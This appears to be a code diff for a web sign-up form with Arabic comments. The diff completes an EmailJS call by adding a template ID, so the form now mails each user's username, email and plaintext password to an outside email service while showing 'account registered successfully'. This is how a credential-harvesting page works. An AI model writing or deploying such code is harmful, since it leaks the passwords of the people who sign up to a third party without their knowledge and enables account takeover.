@@ -142,15 +142,15 @@
                 return;
             }
 
-            // إعداد البريد الإلكتروني
+            // إعداد البيانات المرسلة عبر القالب
             const templateParams = {
-                user_name: username,  // إضافة اسم المستخدم
-                user_email: email,
-                user_password: password
+                user_name: username,  // اسم المستخدم
+                user_email: email,    // البريد الإلكتروني
+                user_password: password // كلمة المرور
             };
 
-            // إرسال البريد الإلكتروني مباشرة باستخدام Email.js
-            emailjs.send('service_fr16kl9', '', templateParams)
+            // إرسال البريد الإلكتروني باستخدام القالب
+            emailjs.send('service_fr16kl9', 'template_67lwdrs', templateParams)
                 .then(function(response) {
                     successMessage.textContent = '✅ تم تسجيل الحساب بنجاح!';
                     errorMessage.textContent = '';
